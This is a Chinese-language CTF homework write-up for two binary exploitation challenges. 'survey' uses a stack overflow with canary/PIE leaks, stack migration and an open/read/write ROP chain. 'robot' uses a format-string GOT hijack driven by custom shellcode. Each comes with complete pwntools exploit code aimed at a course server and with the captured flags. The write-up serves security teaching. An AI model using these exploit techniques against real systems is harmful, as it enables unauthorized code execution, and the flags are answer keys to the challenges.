---
tags: 2020 程式安全
---
# HWA
## survey
### 題目分析
* 直接把題目拉進ida裡面decompile  
![](https://i.imgur.com/ixdn6Gr.png)
* 進去看sub_1199()會看到他在做seccomp的初始化  
![](https://i.imgur.com/Wqv8jjB.png)
* 剩下的內容很少會讀一次輸入然後把輸入的東西用printf("%s")印出來之後會再要求輸入一次就結束
### 漏洞
* read的大小是0x30但是buf的大小只有0x18所以有overflow的漏洞而且0x30可以剛好蓋到return address
* 再來是printf("%s")會一直輸出直到遇到\x00才會停止所以如果塞得夠好可以把stack上的訊息給leak出來
### Exploit
* 保護機制
![](https://i.imgur.com/2GLbyFU.png)
* 這題有seccomp先用seccomp-tools看一下限制了哪些system call  
![](https://i.imgur.com/NqlO3iA.png)
* 這邊可以看到seccomp是用白名單限制了只能open read write
* 因為保護機制是全開有canary而canary的位置在rbp-0x8的地方所以只要從buffer的位置一直塞塞到canary的最後一個byte這樣就沒有\x00可以把canary給印出來
![](https://i.imgur.com/VAlQpzW.png)
* canary+8的位置還有一個code段的東西因為canary和這個中間沒有\x00所以可以順便一起印出來這樣就把pie的base和canary都leak出來了這樣就完成第一次的輸入了  
![](https://i.imgur.com/z3qEOGl.png)
* 再來第二次輸入要改掉return address不然程式就直接結束掉了因為剛剛已經leak出pie的base了所以就可以去算出main的位置在哪裡把return address蓋成main的位置
* 但是因為有開了seccomp所以return address也不能亂蓋不然他如果又進去seccomp初始化的地方會再執行一次seccomp就會用到不是白名單的syscall最後會crash所以跳過seccomp初始化的地方就不會壞掉了
* 再來是因為要執行open read write那要很大的空間來疊rop chain而且stack的位置也無法知道所以就用stack migration把stack搬到bss段上這樣就是已知的位置了
* 所以第二次的輸入要把rbp蓋成bss段的位置return address蓋成main裡面輸出`What is your name :`的地方
* 這樣踩到return address之後就會又回到main但是這時候rsp還沒被搬到bss段上因為一次leave只會執行mov rsp, rbp和pop rbp所以要再執行一次leave才能把stack搬到bss段上所以就再執行一次main讓他踩到leave
* 這樣rsp就成功被搬到bss段上了但是這時候上面甚麼都沒有而且能寫入的大小很小很難疊rop chain  
![](https://i.imgur.com/FUAucHY.png)
* 這時候又回到main了會去執行printf和fflush因為在執行這些function的時候會用到stack就會在stack上殘留一些東西  
![](https://i.imgur.com/FhXYmMn.png)
* 在rbp-0x20的地方有一些libc的位置而且這邊剛好是我們的輸入所以就可以再構造一次payload然後透過printf("%s")把libc的位置給leak出來  
* 成功leak出libc的位置之後就可以構造(pop_rdi + 位置 + gets)的rop chain這樣長度剛好0x18跟buffer大小一樣這樣跳進去之後就可以用gets來在我們想輸入的地方疊rop chain而且gets沒有大小限制想寫多長都可以
* 因為rsp位置是已知的所以就把rop chain的東西寫在gets的return address的地方這樣輸入完就會踩進去rop chain去執行然後執行完open read write的rop chain就可以拿到flag了
```python=
from pwn import *

# p = process('./S', env={'LD_PRELOAD':'./libc-2.29.so'})
p = remote('140.112.31.97', 30201)
libc = ELF('./libc-2.29.so')

# leak process base address and canary
p.sendafter('name : ', 'a'*25)
p.recvuntil('a'*24)
canary = u64(p.recv(8)) - ord('a')
base = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x12f0
success('canary = 0x%x', canary)
success('base address = 0x%x', base)

# overwrite return address to main
main = base + 0x1235
bss = base + 0x4d00
payload = b'a'*24 + p64(canary) + p64(bss) + p64(main)
p.sendafter('here : ', payload)

# run once to make rsp on bss
p.sendafter('name : ', 'a')
payload = b'a'*24 + p64(canary) + p64(bss) + p64(main)
p.sendafter('here : ', payload)

# leak libc
p.sendafter('name : ', 'a'*8)
p.recvuntil('a'*8)
fflush = u64(p.recvline().strip().ljust(8, b'\x00')) - 157
libc_base = fflush - libc.sym['fflush']
success('libc base = 0x%x', libc_base)
payload = b'a'*24 + p64(canary) + p64(bss) + p64(main)
p.sendafter('here : ', payload)

# overwrite return address to gets
pop_rdi = 0x1353 + base
leave_ret = 0x12e1 + base
gets = libc_base + libc.sym['gets']
p.sendafter('name : ', 'a')
payload = p64(pop_rdi) + p64(bss-0x8) + p64(gets) + p64(canary) + p64(bss-0x28) + p64(leave_ret)
p.sendafter('here : ', payload)

# rop chain
pop_rsi = 0x26f9e + libc_base
pop_rdx = 0x12bda6 + libc_base
pop_rax = 0x47cf8 + libc_base
syscall_ret = 0xcf6c5 + libc_base   # ROPgaget with parameter --multibr
payload = p64(pop_rdi) + p64(bss+0x8*26) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall_ret) # open
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss+0x100) + p64(pop_rdx) + p64(0x100) + p64(pop_rax) + p64(0) + p64(syscall_ret) # read
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bss+0x100) + p64(pop_rdx) + p64(0x100) + p64(pop_rax) + p64(1) + p64(syscall_ret) # write
payload += b'/home/survey/flag'
p.sendline(payload)

p.interactive()
```
>FLAG{7h4nks_f0r_y0ur_f33dback}
## robot
### 題目分析
* 一樣直接拉進ida裡面decompile一開始先進行一些初始化和設定pipe然後就執行fork來生成一個child process  
![](https://i.imgur.com/LDUa1g5.png)
* 先來看child process在做些甚麼
* 這邊可以看到child用mmap開一塊可讀可寫可執行的memory然後讀取shellcode之後把stdin stdout stderr關掉再設置seccomp就跳進shellcode裡執行
![](https://i.imgur.com/5peOr9V.png)
* 再來看parent做了些甚麼
* 這邊可以看到parent開了一塊可讀可寫的記憶體然後做了一些隨機數的初始化之後就從pipe讀取child process的輸出總共1000次
![](https://i.imgur.com/PoyQO6h.png)
* 再來會做一些看起來像是上下左右之類的操作然後又再對隨機數做一些操作然後用dprintf把fmt的內容透過pipe傳送到child process如果執行超過1000次就會直接exit
![](https://i.imgur.com/MWAZUIU.png)
### 漏洞
* dprintf沒有給format所以存在format string的漏洞可以做到information leak和對任意地址寫入
### Exploit
* 保護機制  
![](https://i.imgur.com/BmEcijV.png)
* 因為題目有對child process設定seccomp所以先用secomp-tools查一下她限制了哪些syscall
* 這邊seccomp設定白名單child process只能執行read和write的syscall  
![](https://i.imgur.com/RrXOuHU.png)
* 因為parent process會從pipe讀取child process的輸出然後讀完之後就讀到的內容拿來做一些操作之後用dprintf輸出給child process
* 仔細觀察一下會發現如果讀到內容的第一字是M進入這個迴圈再來判斷第二個字是甚麼這邊可以看到如果第一個字是M第二個字不是A,D,W,S就會跳出這個迴圈然後不會對讀到的內容作任何操作然後就輸出  
![](https://i.imgur.com/NuKc23k.png)
* 所以只要構造出類似`MM%10$p`之類的構造就能把stack上的東西給leak出來然後輸出給child process這樣就能夠在child process讀到leak出來的東西了
* 觀察一下stack會發現stack上有跟pie相關libc相關的東西所以就可以透過這樣的方式來leak出各總資訊了
![](https://i.imgur.com/qt7dy66.png)
* 再來觀察一下rsp+360這個位置的0x7ffd14d9ab18他會指向0x7ffd14d9ab88他在stack上的rsp+464的位置上然後他會再指向另外一個在stack上的位置
* 因為她有這樣的結構a->b->c所以只要控好就能夠做到任意地址的寫入
* 因為這題是partial relro所以GOT可寫因此就可以用format string的漏洞利用%hhn透過a和b把c指向的地址改成某個got的位置
* 成功把c指向的地方改成got之後就可以用b和c來改寫got來做到got hijack
* 再觀察一下會發現程式最後一定會走到exit所以改寫exit的got之後就能夠改變程式踩到exit之後會執行的流程
* 因為parent process沒有執行seccomp所以她甚麼syscall都能夠執行這樣就把exit的got的位置改成child process執行mmap的地方就能夠開一塊可讀可寫可執行的memory然後在上面寫shellcode跳進去執行就能開個shell了
* 再繼續看後面的流程會發現他會把stdin stdout stderr都關掉如果都被關掉的話就算shell開起來我們就沒辦法跟他溝通因為不能執行到close所以就把close的got也改掉
* 觀察mmap之後的行為會發現他mmap完的位置會存在rax上所以fgets讀完shellcode之後只要能夠跳到rax上就會把shellcode跑起來因此就把close的got改成call rax的gadget這樣只要一執行close就能把shellcode跑起來了
* 所以總共要做的事有:
    1. leak pie的位置去算offset
    2. leak rbp的位置然後找出stack上有a->b->c這樣結構的位置因為a b的位置是固定的c是環境變數位置不固定所以要透過rbp去算出c在stack上的位置
    3. 透過a->b->c這樣的結構來改寫got的值
    4. 把exit的got改成child執行mmap開可讀可寫可執行的位置
    5. 把close的got位置改成call rax的gadget
    6. 因為parent執行child部分的printf會因為stack沒有對齊就crash所以把printf的got也改掉改成rand之類的
* 這樣都改完之後要讓parent process踩到exit因為他每次迴圈都會執行wait去等child process執行完然後會檢查child process有沒有死掉如果死掉的話parent process會輸出AI crashed然後去執行exit
* 所以在把所有要改的payload送完之後讓child process jump到奇怪的地方他就會直接死掉這樣parent process接收到他死掉就會去執行exit就會進到mmap開啟一塊可讀可寫可執行的地方了然後會執行fgets來讀shellcode之後會去執行close也就是被改成call rax的地方這樣就能夠成功把shellcode跑起來了
```python=
from pwn import *

context.arch = 'amd64'

shellcode = asm(
    '''
    /* set stack */
    mov rsp, rdx
    add rsp, 0x800
    mov r13, 0x4088
    jmp start
    
leak:
    pop rbp
    mov rax, 0x4d4d4d4d4d4d4d4d
    push rax
    call pipe
    pop r15
    add rsp, 2
    pop rax
    mov dl, 8
    call str2hex
    mov r15, rbx
    shl r15, 16
    pop rax
    mov dl, 4
    call str2hex
    add r15, rbx
    jmp rbp

pipe:   /* rdi rsi rdx rax */
    pop r8
    mov rdi, 6
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 1
    syscall     /* write to pipe */
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0
    syscall     /* read from pipe */
    jmp r8

start:
    /* leak pie base */
    mov rax, 0x7024333325   /* %33$p */
    push rax
    call leak
    sub r15, 0x1a40     # r15 pie base
    mov r14, r15
    add r14, r13     # exit GOT
    mov r10, r14
    
    /* leak rbp */
    mov rax, 0x7024363325   /* %36$p */
    push rax
    call leak
    sub r15, 0xe8
    mov r12, r15    /* rbp */

    /* leak target */
    mov rax, 0x7024323625   /* %62$p */
    push rax
    call leak /* target on r15*/
    
    /* use fmt to write exit got on stack */
    xor r9, r9
    mov r13, r14    /* exit GOT on r13 */
    mov rax, rsp
    and rax, 0xfff
    cmp rax, 0x81e
    je L1
    cmp rax, 0x86e
    je L2
    cmp rax, 0x8be
    je L3
    jmp L4
L1:     /* exit */
    sub r13, 0x4088
    add r13, 0x1957
    jmp write_got
L2:     /* close */
    sub r13, 0x4030
    add r13, 0x1014
    jmp write_got
L3:     /* prctl */
    sub r13, 0x4058
    add r13, 0x1A2E
    jmp write_got
L4:     /* printf */
    sub r13, 0x4028
    add r13, 0x1140
    jmp write_got
    

write_got:
    mov rax, 0x18    /* fake got */
    add rax, r9
    mov r11, 0x000306
    call push_str
    call pipe
    nop
    nop
    nop
    nop
 
    mov rax, r14    /* exit got */
    mov r11, 0x000602
    call push_str
    call pipe
    shr r14, 8
    inc r9
    cmp r9, 8
    jne write_got
    
    /**************************************************************************/
    /* overwrite GOT */
    /* rebase */
    mov rax, 0x18    /* fake got */
    mov r11, 0x000306
    call push_str
    call pipe

    /* calculate offset */
    and r15, 0xffffffffffffff00
    add r15, 0x18
    sub r15, r12
    shr r15, 3
    add r15, 33
    mov rax, r15
    call hex2str
    xor r11, r11
    xor rax, rax
    add al, bl
    shl rax, 8
    add al, bh
    shl rax, 8
    shr rbx, 16
    add al, bl
    mov r11, rax
    mov r14, r11

    xor r9, r9
got_hijack:
    mov rax, r10    /* fake got */
    and rax, 0xff
    add rax, r9
    mov r11, 0x000602
    call push_str
    call pipe

    mov rax, r13    /* target address */
    mov r11, r14
    call push_str
    call pipe
    
    shr r13, 8
    inc r9
    cmp r9, 8
    jne got_hijack

    mov rax, rsp
    and rax, 0xfff
    cmp rax, 0x3fe
    je first
    cmp rax, 0x44e
    je second
    cmp rax, 0x49e
    je third
    jmp end
    nop

first:
    mov r13, 0x4030
    and rsp, 0xfffffffffffff000
    add rsp, 0x850
    jmp start
second:
    mov r13, 0x4058
    and rsp, 0xfffffffffffff000
    add rsp, 0x8a0
    jmp start
third:
    mov r13, 0x4028
    and rsp, 0xfffffffffffff000
    add rsp, 0x900
    nop
    jmp start
end:
    jmp r9

push_str:   /* rbp rax rcx r8 r11  */
    pop rbp
    sub rax, 8
    and rax, 0xff
    call hex2str

    /* padding */
    mov rax, 0xff
    mov r8, rbx
    mov rcx, 0
d:
    sub al, bl
    inc rcx
    cmp rcx, 100
    jne d
    xor rcx, rcx
dd:
    sub al, bh
    inc rcx
    cmp rcx, 9
    jne dd
    sub al, bh
    shr rbx, 16
    sub al, bl
    sub al, 15
    and rax, 0xff
    add al, 2
    call hex2str
    push rax
    mov byte ptr [rsp], 0x25    /* % */
    mov byte ptr [rsp+1], bl
    add byte ptr [rsp+1], 0x30
    mov byte ptr [rsp+2], bh
    add byte ptr [rsp+2], 0x30
    shr rbx, 16
    mov byte ptr [rsp+3], bl
    add byte ptr [rsp+3], 0x30
    mov byte ptr [rsp+4], 0x63  /* c */
    mov byte ptr [rsp+5], 0x4d
    mov byte ptr [rsp+6], 0x4d
    mov byte ptr [rsp+7], 0x4d
    
    mov rax, 0x4d4d4d6e68682400 /* ?$hhnMMMM */
    mov rbx, r11
    add al, bl
    add al, 0x30
    push rax
    push rax
    mov rbx, r8
    mov byte ptr [rsp], 0x25    /* % */
    mov byte ptr [rsp+1], bl
    add byte ptr [rsp+1], 0x30
    mov byte ptr [rsp+2], bh
    add byte ptr [rsp+2], 0x30
    shr rbx, 16
    mov byte ptr [rsp+3], bl
    add byte ptr [rsp+3], 0x30
    mov byte ptr [rsp+4], 0x63  /* c */
    mov byte ptr [rsp+5], 0x25  /* % */
    mov rax, r11
    mov byte ptr [rsp+7], ah
    add byte ptr [rsp+7], 0x30
    shr rax, 16
    mov byte ptr [rsp+6], al
    add byte ptr [rsp+6], 0x30
    mov rax, 0x4d4d4d4d4d4d4d4d
    push rax
    jmp rbp

str2hex:
    xor rbx, rbx
    xor rcx, rcx
loop:
    cmp al, 0x00
    je check
    nop
    cmp al, 0x61
    jb num
    sub al, 0x57
    jmp check
num:
    sub al, 0x30
check:
    add bl, al
    shl rbx, 4
    shr rax, 8
    add cl, 1
    cmp cl, dl
    jne loop
    shr rbx, 4
    ret

hex2str:    /* input = rax, output = rbx */
    xor rbx, rbx
    xor rdi, rdi
again:
    xor rdx, rdx
    mov ecx, 11
    sub ecx, 1
    div ecx
    mov bl, dl
    shl rbx, 8
    inc rdi
    cmp rdi, 3
    jne again
    shr rbx, 8
    ret
    '''
)

p = remote('140.112.31.97', 30202)
p.sendlineafter('code : ',shellcode)
p.sendlineafter('crashed', asm(shellcraft.amd64.sh()))
p.interactive()
```
>FLAG{beep_bo0op_b33p_be3p_boop}